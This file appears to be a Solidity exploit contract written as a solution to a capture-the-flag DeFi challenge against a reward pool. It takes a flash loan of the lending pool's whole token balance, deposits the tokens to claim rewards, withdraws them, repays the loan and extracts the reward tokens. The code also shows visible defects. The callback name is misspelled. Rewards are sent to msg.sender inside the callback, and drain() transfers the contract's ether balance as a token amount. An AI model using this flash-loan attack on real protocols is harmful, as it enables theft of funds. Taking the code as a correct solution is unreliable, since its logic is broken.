// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";

contract AttackRewarder {

    TheRewarderPool rewardPool;
    FlashLoanerPool loanPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(address _rwPool, address _dvt, address _rwt, address _lnPool) {
        rewardPool = TheRewarderPool(_rwPool);
        liquidityToken = DamnValuableToken(_dvt);
        rewardToken = RewardToken(_rwt);
        loanPool = FlashLoanerPool(_lnPool);
    }

    function recieveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        //rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewards);
    }

    function drain() public {
        uint amount = liquidityToken.balanceOf(address(loanPool));
        loanPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, address(this).balance);
    }
}
